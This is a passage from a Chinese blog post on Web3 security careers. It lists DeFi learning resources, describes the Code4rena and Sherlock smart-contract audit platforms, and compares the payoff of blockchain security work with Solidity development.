<li><strong>慢雾科技&amp;派盾漏洞报告</strong>：两大区块链安全机构会定期发布DeFi漏洞分析报告，通过真实案例（如闪电贷攻击、合约权限漏洞等），反向推导DeFi业务流程中的风险点，帮助理解业务逻辑与安全的关联性；</li>
<li><strong>DeFi Llama行业报告</strong>：作为DeFi锁仓量数据权威平台，其报告不仅包含数据统计，还会分析各赛道（如借贷、DEX、LSD）的业务创新和趋势，适合跟踪行业动态。</li>
</ul>
</li>
</ol>
<h3 id="实战向线上课程"><a href="#实战向线上课程" class="headerlink" title="实战向线上课程"></a>实战向线上课程</h3><ol>
<li><strong>Coursera《Decentralized Finance (DeFi) Primitives》</strong><br> 由《DeFi与金融的未来》作者之一坎贝尔·R·哈维授课，属于“DeFi：金融的未来”专项课程的核心模块。课程深入讲解代币设计、去中心化交易所运作、闪电贷机制等核心业务，包含实操作业，适合想要通过案例和实践深化业务理解的学习者，课程支持多语言字幕，兼顾不同基础用户。</li>
<li><strong>CSDN DeFi面试题库</strong><br> 这份资料虽为面试导向，但内容涵盖DEX、借贷、稳定币、闪电贷、DAO治理等核心业务模块，还包含“如何防范DeFi清算风险”“流动性池套利原理”等实操性问题。通过梳理题库，能快速掌握DeFi业务的核心考点与关键逻辑，适合巩固业务知识并对接实战场景。</li>
</ol>
<h1 id="Code4rena是什么"><a href="#Code4rena是什么" class="headerlink" title="Code4rena是什么"></a>Code4rena是什么</h1><p>Code4rena（简称C4）是2021年成立的Web3领域社区驱动型智能合约审计平台，2024年8月被收购，凭借创新的竞争性审计模式颠覆了行业，成为众多头部加密货币项目信赖的安全审计解决方案提供商。以下是关于它的核心信息详细介绍：</p>
<ol>
<li><strong>核心运作模式</strong><ul>
<li><strong>角色分工明确</strong>：平台主要涉及三类核心角色，一是<strong>安全审计员（Wardens）</strong>，即注册的安全研究人员，他们通过审计代码寻找漏洞来获取赏金，目前平台注册审计员已超10400名；二是<strong>项目发起方（Sponsors）</strong>，也就是需要进行智能合约审计的加密项目，他们设立赏金池吸引审计员参与；三是<strong>评审员（Judges）</strong>，负责判定漏洞的有效性、严重程度和报告质量，同时评估审计员的表现，保障审计结果的可靠性。</li>
<li> <strong>竞争性审计流程</strong>：项目发起方提出审计需求后，平台会组织大量审计员开展竞争性审计。相比传统审计通常仅2名左右审计人员参与，C4每次审计平均能汇集上百名安全专家。审计结束后，评审员完成风险分类，最终向项目方出具包含漏洞详情、风险等级和修复建议的审计报告，后续还会提供漏洞修复审核等持续支持。</li>
</ul>
</li>
<li><strong>核心服务类型</strong><ul>
<li> <strong>竞争性审计</strong>：这是其标志性服务，也是颠覆Web3审计行业的核心模式。通过数百名审计员竞争找漏洞的形式，挖掘代码中高严重级别的安全隐患，适配大多数普通项目的审计需求。</li>
<li> <strong>Zenith审计</strong>：专门组建业绩优异的顶尖审计团队，为项目提供深度安全分析，适合对安全级别要求极高的重点项目。</li>
<li> <strong>漏洞修复审核</strong>：针对项目方完成漏洞修复后的成果，提供二次审核服务，确保修复方案有效落地，比如Hybra Finance的漏洞修复就曾在该平台进行多轮审核。</li>
</ul>
</li>
<li><strong>与传统审计和漏洞赏金计划的差异</strong><table>
<thead>
<tr>
<th>对比维度</th>
<th>Code4rena</th>
<th>传统审计</th>
<th>普通漏洞赏金计划</th>
</tr>
</thead>
<tbody><tr>
<td>人员规模</td>
<td>上百名审计员参与，视角多元</td>
<td>通常仅少数几名审计人员，能力范围有限</td>
<td>参与人数不确定，缺乏集中组织</td>
</tr>
<tr>
<td>激励机制</td>
<td>赏金池明确，审计员有稳定收益预期</td>
<td>审计机构收取固定服务费用，审计人员无额外激励</td>
<td>无固定赏金保障，审计投入与回报不成正比</td>
</tr>
<tr>
<td>灵活性</td>
<td>48小时内可启动审计，适配项目快速上线需求</td>
<td>流程固定，等待周期长</td>
<td>无统一启动和推进流程，效率参差不齐</td>
</tr>
</tbody></table>
</li>
<li> <strong>行业成果与影响力</strong>：截至目前，Code4rena已完成488次审计，累计发现超1365个高危漏洞，各类漏洞相关发现达25152个。众多头部加密协议都选择其进行智能合约审计，其审计模式不仅提升了Web3领域智能合约的审计效率和深度，也为安全研究人员提供了积累实战经验、展现能力的核心平台。</li>
</ol>
<h1 id="Sherlock是什么"><a href="#Sherlock是什么" class="headerlink" title="Sherlock是什么"></a>Sherlock是什么</h1><p>Sherlock 是2021年成立于以太坊链上的Web3领域智能合约全生命周期安全平台，凭借混合审计模式和创新的安全保障机制脱颖而出，还被TechBullion评为2026年最佳Web3智能合约审计公司，深受Aave、以太坊基金会等头部项目信赖。以下是其核心信息的详细介绍：</p>
<ol>
<li><strong>独特的混合审计模式</strong><br> 这是Sherlock区别于多数审计平台的核心优势，它融合了传统专家审计与竞赛式审计的优点。一方面会指派业绩优异的资深安全专家主导项目审计，保障审计的专业性和深度；另一方面会发起审计竞赛，邀请全球数十名安全专家同台竞争找漏洞，借助众包力量挖掘常规审计易遗漏的问题。并且平台会依据过往审计竞赛、协作审计中的表现来动态组建审计团队，针对不同协议的风险特点匹配对应优势的审计人员，比固定团队审计覆盖更全面。此外，2025年9月它还推出了Sherlock AI审计工具，可贯穿开发全流程扫描代码提交和拉取请求，帮助开发人员提前发现漏洞，完善了其全生命周期安全保障体系。</li>
<li><strong>多元化核心服务</strong><ul>
<li>  <strong>基础审计服务</strong>：包含传统定制审计和审计竞赛两种形式。传统审计中会出具详细的漏洞报告，审计竞赛则以赏金激励专家挖掘高危漏洞，像Optimism、Notional等项目都曾通过其审计竞赛发现代码中的特殊问题。</li>
<li>  <strong>财务保障与漏洞赏金</strong>：它是业内少有的为审计提供高额赔付保障的平台，若审计遗漏漏洞导致项目遭受攻击，最高可向协议方赔付200万美元。同时还能为项目搭配漏洞赏金计划，且设置了提交押金机制减少无效报告，再通过专家筛选确保仅向项目方传递关键漏洞信息。</li>
<li>  <strong>智能合约保障服务</strong>：与常规面向用户的安全保障不同，Sherlock的保障服务直接对接协议方，一旦协议出现漏洞损失，可覆盖所有用户的相关损失，无需用户单独操作，大幅降低了协议方的赔付压力和用户的风险成本。</li>
</ul>
</li>
<li><strong>清晰的角色与流程</strong><br> 平台核心涉及三类角色，分别是提供智能合约的项目发起方、参与漏洞挖掘的安全审计专家以及监督赔付流程的第三方机构。流程上，项目方提出审计需求后，平台组建定制化审计团队并发起审计竞赛；审计结束后提交漏洞报告与修复建议；后续若出现遗漏漏洞引发的损失，由第三方机构监督保障金的赔付流程，确保公平公正。</li>
<li><strong>行业影响力与优势</strong><br> 其客户涵盖Aave、1inch、Morpho等众多头部DeFi协议和以太坊基金会等机构。相较于传统审计平台，它既解决了固定团队视角局限的问题，又通过财务赔付机制替代单纯的口碑背书，让平台与项目方的利益深度绑定。同时，因前期审计工作扎实，其提供的智能合约保障定价也更具竞争力，还能以低于多数机构单独审计的成本，为项目打包提供审计、百万级保障和高额赏金等一站式服务。</li>
</ol>
<h1 id="安全的投入产出比是不是太低了，不如solidity开发？"><a href="#安全的投入产出比是不是太低了，不如solidity开发？" class="headerlink" title="安全的投入产出比是不是太低了，不如solidity开发？"></a>安全的投入产出比是不是太低了，不如solidity开发？</h1><p>不能简单判定区块链安全领域的投入产出比低于Solidity开发，二者的投入产出逻辑、适用场景和长期价值差异显著。区块链安全的投入更偏向“风险防控”和“长期增值”，Solidity开发则侧重“快速落地”和“短期变现”，以下从多维度对比分析，帮你清晰理解二者的投入产出特点：</p>
<ol>
<li><strong>短期投入与变现速度</strong><ul>
<li><strong>Solidity开发短期投入产出比更占优</strong>：Solidity学习曲线相对平缓，语法接近JavaScript，新手借助Remix、Hardhat等成熟工具，短期内就能开发基础合约并完成部署。变现路径也很直接，比如承接NFT铸造、简单DApp开发等外包项目，或入职初创团队做合约开发，国内初级Solidity开发月薪普遍在1万 - 2.5万，能快速实现技能变现。而且项目上线周期短，开发者可快速通过多接项目、迭代产品获得收益。</li>
<li> <strong>区块链安全短期投入高、变现慢</strong>：想从事安全相关工作，除了懂Solidity，还得深入学习EVM底层、密码学、DeFi业务逻辑，以及Slither、Foundry等审计测试工具，甚至要研究大量历史漏洞案例。前期投入的学习成本远超基础Solidity开发。且初级安全岗位少，入门多依赖漏洞赏金平台（如Code4rena）提交报告积累口碑，初期可能投入大量时间却难有回报，短期投入产出比看似较低。</li>
</ul>
</li>
<li><strong>长期收益与收入天花板</strong><ul>
<li> <strong>Solidity开发收入存在瓶颈，竞争加剧易稀释收益</strong>：随着Solidity生态成熟，入门开发者越来越多，基础开发岗位竞争逐渐激烈。普通合约开发的薪资增长会随着技能同质化而放缓，若仅停留在“编写基础合约”层面，很难突破收入天花板。此外，项目迭代中还可能因代码漏洞面临返工，若因漏洞造成资产损失，还需承担相应责任，后期维护成本会逐步增加。</li>
<li> <strong>区块链安全长期收益更高，增值空间大</strong>：安全是区块链的刚性需求，2025年智能合约漏洞导致的资产损失累计已超120亿美元，项目方对安全审计的付费意愿极强。简单合约审计费就达15万 - 30万元，复杂DeFi协议更是高达40万 - 80万元。从薪资看，国外中级区块链安全专家年薪达11万 - 15万美元，高级专家更是超15万美元；国内资深安全审计师薪资也远超同级Solidity开发，还能转型为安全顾问、安全总监，甚至创立审计公司。同时，安全专家的经验越丰富越吃香，随着行业发展，其技能价值会持续提升，不会因技术迭代快速贬值。</li>
</ul>
</li>
<li><strong>风险与投入容错率</strong><ul>
<li> <strong>Solidity开发风险传导快，容错成本高</strong>：Solidity合约一旦部署无法修改，若因代码漏洞（如重入攻击、权限失控）引发安全事故，开发者可能面临项目方索赔、行业口碑崩塌等问题。比如某团队因忽略整数溢出问题，导致合约被攻击，不仅项目搁置，开发者也很长时间难以接到新订单，这种隐性风险会间接降低实际投入产出比。</li>
<li> <strong>区块链安全以“控风险”为核心，容错率相对高</strong>：安全工作的核心是提前排查漏洞，即便初期漏检小漏洞，也可通过后续复盘优化提升能力。而且随着经验积累，漏洞判断准确率会越来越高，失误率会持续降低。此外，安全领域的个人口碑是“正向积累”的，一旦在漏洞赏金平台挖出重大漏洞，或为知名项目完成审计，会快速获得行业认可，后续合作和变现会更顺畅。</li>
</ul>
</li>
<li><strong>变现模式的多样性</strong><ul>
<li> <strong>Solidity开发变现模式较单一</strong>：主要依赖全职岗位薪资、外包项目，或参与项目获得代币激励，变现渠道集中在“代码产出”相关领域。虽然也能通过开发工具、课程变现，但门槛较高，多数开发者难以触及。</li>
<li> <strong>区块链安全变现模式更丰富</strong>：除了全职审计、安全岗位薪资，还能通过漏洞赏金平台赚奖金、为项目提供专项安全咨询、开发安全工具（如漏洞检测插件）、开设安全课程等方式变现。比如资深安全研究员开发的审计工具可对外售卖，安全课程也能持续产生收益，多种变现渠道能进一步提升长期投入产出比。</li>
</ul>
</li>
</ol>
<p>综上，若追求快速变现，Solidity开发是更优选择；但从长期来看，区块链安全的投入产出比并不低，且随着行业对安全需求的持续增长，其不可替代性和增值空间会远超基础Solidity开发。若你已有渗透测试背景，转型区块链安全，前期积累的对抗性思维还能成为核心优势，长期来看性价比更高。</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/Web3/">Web3</a>
                    
                      <a class="hover-with-bg" href="/tags/audit/">audit</a>
                    
                  </div>
                
              </div>
              
                
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/12/18/8bf2d8d4f8cc/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Damn Vulnerable DeFi（七）</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/12/18/fde76ff941b2/">
                        <span class="hidden-mobile">Damn Vulnerable DeFi（五）</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


            

                
                  <a id="scroll-top-button" href="#" role="button">
                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
                  </a>
                  

                    
                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
                        

                          
      </main>

      <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>






  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



    </body>

  </html>